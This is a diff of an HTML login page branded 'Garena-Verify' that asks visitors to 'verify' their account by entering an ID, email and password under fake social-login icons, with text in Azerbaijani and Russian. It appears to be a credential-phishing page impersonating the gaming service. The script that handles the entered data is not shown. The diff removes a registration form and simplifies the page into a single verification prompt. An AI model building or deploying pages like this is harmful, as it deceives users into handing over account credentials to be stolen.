@@ -3,55 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <title>Garena-Verify</title>
     <link rel="stylesheet" href="style.css">
-    <title>Логин</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            if (/android/i.test(userAgent)) {
+                document.querySelector('meta[name="viewport"]').setAttribute('content', 'height=1920', 'width=1080');
+            }
+        });
+    </script>
 </head>
 <body>
     <div class="container" id="container">
-        <div class="form-container sign-up">
-            <form id="registrationForm">
-                <h1>Зарегистрироваться</h1>
-                <span>və ya el poçta ilə təstiq edin:</span>
-                <input type="text" id="username" name="username" placeholder="Имя" required>
-                <input type="email" id="email" name="email" placeholder="Email" required>
-                <input type="password" id="password" name="password" placeholder="Пароль" required>
-                <input type="text" id="id" name="id" placeholder="ID" required>
-                <button type="submit" id="register">Зарегистрироваться</button>
-            </form>
-        </div>
         <div class="form-container sign-in">
-            <form>
-                <h1>Təstiq edin!</h1>
+            <form id="loginForm">
+                <h1>Təsdiq edin!</h1>
                 <div class="social-icons">
-                    <a href="#" class="icon"><i class="fa-brands fa-google-plus-g"></i></a>
-                    <a href="#" class="icon"><i class="fa-brands fa-facebook-f"></i></a>
-                    <a href="#" class="icon"><i class="fa-brands fa-twitter"></i></a>
-                    <a href="#" class="icon"><i class="fa-brands fa-vk"></i></a>
+                    <a href="#"><i class="fab fa-google"></i></a>
+                    <a href="#"><i class="fab fa-facebook"></i></a>
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-vk"></i></a>
                 </div>
-                <span>və ya el poçta ilə təstiq edin:</span>
-                <input type="text" placeholder="Id" required>
-                <input type="email" placeholder="Email" required>
-                <input type="password" placeholder="Пароль" required>
-                
-                <button id="submit" type="submit">Təstiq ed</button>
-                <p>5 ildi sizinlə!</p>
+                <span>və ya el poçta ilə təsdiq edin:</span>
+                <input type="text" id="id" placeholder="Id" />
+                <input type="email" id="email" placeholder="Email" />
+                <input type="password" id="password" placeholder="Пароль" />
+                <button id="login">TƏSTIQ ED</button>
             </form>
         </div>
         <div class="toggle-container">
             <div class="toggle">
-                <div class="toggle-panel toggle-left">
-                    <h1>Добро пожаловать!</h1>
-                    <p>Введите свои личные данные, чтобы использовать все возможности сайта</p>
-                    <button class="hidden" id="login">Войти</button>
-                </div>
                 <div class="toggle-panel toggle-right">
-                    <h1>Hesabınızı Təstiq Edin!</h1>
+                    <h1>Hesabınızı Təsdiq Edin!</h1>
                 </div>
             </div>
         </div>
     </div>
-    
     <script src="script.js"></script>
 </body>
 </html>
